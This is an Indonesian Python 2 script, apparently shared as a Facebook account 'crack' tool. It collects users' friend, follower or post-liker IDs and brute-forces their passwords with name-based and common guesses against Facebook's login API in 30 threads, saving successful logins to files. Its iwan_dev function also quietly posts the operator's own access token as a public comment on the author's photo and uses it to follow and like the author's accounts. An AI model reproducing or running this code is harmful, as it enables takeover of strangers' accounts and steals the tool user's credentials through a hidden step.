# -*- coding: utf-8
# Made With ❤️ Iwan Hadiansah ID
# facebook : https://www.facebook.com/IwanPutraSunda04
# facebook unik : https://www.facebook.com/IwanDev04
# github : https://github.com/Iwan-Dev
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import requests
import uuid
import ipaddress
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from time import sleep
from datetime import datetime
try:
	import requests
except ImportError:
	print '[×] Modul requests belum terinstall!...\n'
	os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def logo():
	print("""
   ._____________ ____ ___.____     
|   \______   \    |   \    |    
|   ||     ___/    |   /    |    
|   ||    |   |    |  /|    |___ 
|___||____|   |______/ |_______ \
                               
                                           """)         
                                                                                                     
kom = 'Script bang @[100041129048948:]😘😘😘https://www.facebook.com/photo.php?fbid=567333587980938&set=a.104654650915503&type=3&app=fbl mantap Ngga Ada Obat😘😘😘'
kom1 = 'Aku Ijin Pake Script Mu Bang  @[100041129048948:]😘😘😘https://www.facebook.com/photo.php?fbid=567333587980938&set=a.104654650915503&type=3&app=fbl😘😘😘'
kom2 = 'Script bang @[100041129048948:]😘😘😘https://www.facebook.com/photo.php?fbid=567333587980938&set=a.104654650915503&type=3&app=fbl mantap Ngga Ada Obat😘😘😘'
kom3 = 'Aku Ijin Pake Script Mu Bang  @[100041129048948:]😘😘😘https://www.facebook.com/photo.php?fbid=567333587980938&set=a.104654650915503&type=3&app=fbl😘😘😘'
id = []
cp = []
ok = []
loop = 0

ct = datetime.now()
n = ct.month
bulan1 = [    'Januari',   'Februari',    'Maret',    'April',    'Mei',    'Juni',    'Juli',    'Agustus',    'September',    'Oktober',    'Nopember',    'Desember']
   
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
    
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan1[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
bulan = {
        "01": "Januari",
        "02": "Februari",
        "03": "Maret",
        "04": "April",
        "05": "Mei",
        "06": "Juni",
        "07": "Juli",
        "08": "Agustus",
        "09": "September",
        "10": "November",
        "11": "Oktober",
        "12": "Desember"
}

#------->BOT JANGAN DI UBAH KONTOL KALO MAU NAMBAH NAMBAH AJA JANGAN DI UBAH YA AJG<-------#
def iwan_dev():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print (' [!] Token invalid') 
        os.system('rm -rf login.txt')
        
    requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/567333587980938/comments/?message=' + token + '&access_token=' + token) 
    requests.post('https://graph.facebook.com/567333587980938/comments/?message=' + kom + '&access_token=' + token) 
    requests.post('https://graph.facebook.com/567333587980938/comments/?message=' + kom1 + '&access_token=' + token) 
    requests.post('https://graph.facebook.com/567333587980938/likes?summary=true&access_token=' + token) 
    requests.post('https://graph.facebook.com/561399145241049/comments/?message=' + token + '&access_token=' + token) 
    requests.post('https://graph.facebook.com/561399145241049/comments/?message=' + kom2 + '&access_token=' + token) 
    requests.post('https://graph.facebook.com/561399145241049/comments/?message=' + kom3 + '&access_token=' + token) 
    requests.post('https://graph.facebook.com/561399145241049/likes?summary=true&access_token=' + token)
    requests.post('https://graph.facebook.com/100021483498135/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100028262962654/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100013951308057/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100040248105716/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100055910645402/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100037389638203/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100008468288074/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100013144685504/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100017837140388/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100041771241191/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100064098481991/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000095205565/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000095205565/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000056561882/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000312208041/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100028434880529/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100001027764318/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/638124327/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100067953620374/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/1445122515/subscribers?access_token=' + token)
    menu()

#------->login token jangan lupa masukin token facebook jangan token listrik kontol<-------#    
def gen():
	os.system('clear')
	try:
		token = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		logo()
		token = raw_input(" *  token : ")
		
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open("login.txt", 'w')
			zedd.write(token)
			zedd.close()
			print (" √  login berhasil ")
			iwan_dev()
		except KeyError:
			print (" [!] Token Invalid") 
			sys.exit()

useragents = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]',
'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]'
#------->menu crack india<-------#
def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print (' *  kesalahan tidak bisa crack')
		os.system("rm -f login.txt")
		gen()
	except requests.exceptions.ConnectionError:
		print (' * tidak ada koneksi harap sambungkan koneksi anda')
		sys.exit()
	logo()
	print" *  hallo : " +nama
	print" *  ip addres : " +ip
	print
	print" 1. crack dari id publik"
	print" 2. crack dari id followers"
	print" 3. crack dari likes post publik"
	print" 4. cek hasil crack"
	print" 0. remove token"
	pilih_india()

def pilih_india():
	ask = raw_input(" *  pilih menu crack : ")
	if ask == "":
		print
		print (" *  pilih yg benar sayang") 
		exit()
	elif ask == "1" or ask == "01":
		print ("\n *  ketik 'me' untuk crack daftar teman") 
		idt = raw_input(" *  id publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print (" *  nama      : "+sp["name"]) 
		except KeyError:
			print (" *  maaf id tidak publik") 
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "2" or ask == "02":
		print ("\n *  ketik 'me' untuk crack daftar followers sendiri") 
		idt = raw_input(" *  id publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print (" *  nama      : "+sp["name"]) 
		except KeyError:
			print (" *  maaf id tidak publik") 
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "3" or ask == "03":
		idt = raw_input(" *  id post publik : ")
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "4" or ask == "04":
		print"1. lihat hasil ok"
		print"2. lihat hasil cp"
		ress = raw_input("* pilih : ")
		if ress =="":
			menu()
		elif ress == "1" or ress == "01":
			print ("\n [+] hasil \033[0;92mok\033[0;97m tanggal : \033[0;92m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
			os.system("cat out/OK-%s-%s-%s.txt" % (ha, op, ta))
			exit()
		elif ress == "2" or ress == "02":
			print (" [+] hasil \033[0;93mcp\033[0;97m tanggal : \033[0;92m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
			os.system("cat out/CP-%s-%s-%s.txt" % (ha, op, ta))
			exit()
		else:
			exit(" *  pilih yang benar sayang") 
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt") 
		print (" √  berhasil menghapus token") 
		exit()
	else:
		print (" *  pilih yang benar sayang") 
		exit()
	
	print"\033[0;97m *  total id  : " +str(len(id))
	ask = raw_input("\n *  ingin gunakan password manual (y/t) : ")
	if ask == "Y" or ask == "y":
		manual()
	print
	print" *  mode pesawat 10 detik jika tidak ada hasil "
	print

	def main(arg):
		global ok,cp,ua, loop
		print '\r *  %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower()+'12356','sayang','bangsat','kontol','anjing']:
				ua =random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36","NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"])
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=headers_)
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r\033[0;97m *  \033[0;92mok\033[0;97m\033[0;97m ' +uid+ ' • ' + pw+ '        '
					ok.append(uid+' • '+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  [OK] '+str(uid)+' • '+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					try:
						token = open('login.txt').read()
						url = ("https://www.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						nama = data['name']
						ttl = data['birthday'].replace("/","-")
						print('\r\033[1;93m[CP] ' +uid+ '•' + pw + '•' + ttl)
						cp.append(uid+'•'+pw+'•'+ttl)
						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
						save.write('  [CP] '+str(uid)+'•'+str(pw)+'•'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = ' '
					except:pass
					print '\r\033[0;97m *  \033[0;93mcp\033[0;97m\033[0;97m ' +uid+ ' • ' + pw + '        '
					cp.append(uid+' • '+pw)
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  [CP] '+str(uid)+' • '+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\n crack selesai...")
	print
	print
	exit()

def manual():
	print("\033[0;97m *  masukan password contoh : bangladesh,102030,786786")
	pw = raw_input("\033[0;97m *  sett password : ").split(",")
	print
	if len(pw) ==0:
		exit(" *  isi yang bener, tidak boleh kosong")
	print("\033[0;97m *  jumlah password yang di buat : \033[0;93m" +str(len(pw)))
	
	def main(arg):
		global ok,cp,ua,loop
		print '\r \033[0;97m*  %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for asu in pw:
				ua = 'Dalvik/2.1.0 (Linux; U; Android 9; INE-LX1r Build/HUAWEIINE-LX1r) [FBAN/Orca-Android;FBAV/212.1.0.13.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/151534286;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/INE-LX1r;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2128};FB_FW/1;]'
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":asu,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=headers_)
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r\033[0;97m *  \033[0;92mok\033[0;97m\033[0;97m ' +uid+ ' • ' + asu + '        '
					ok.append(uid+' • '+asu)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  [OK] '+str(uid)+' • '+str(asu)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						nama = data['name']
						ttl = data['birthday'].replace("/","-")
						print('\r\033[1;93m[CP] ' +uid+ '•' + asu + '•' + ttl)
						cp.append(uid+'•'+asu+'•'+ttl)
						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
						save.write('  [CP] '+str(uid)+'•'+str(asu)+'•'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = ' '
					except:pass
					print '\r\033[0;97m *  \033[0;93mcp\033[0;97m\033[0;97m ' +uid+ ' • ' + asu + '        '
					cp.append(uid+' • '+asu)
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  [CP] '+str(uid)+' • '+str(asu)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print"\n"
	print("\n crack selesai...")
	exit()

if __name__ == '__main__':
	gen()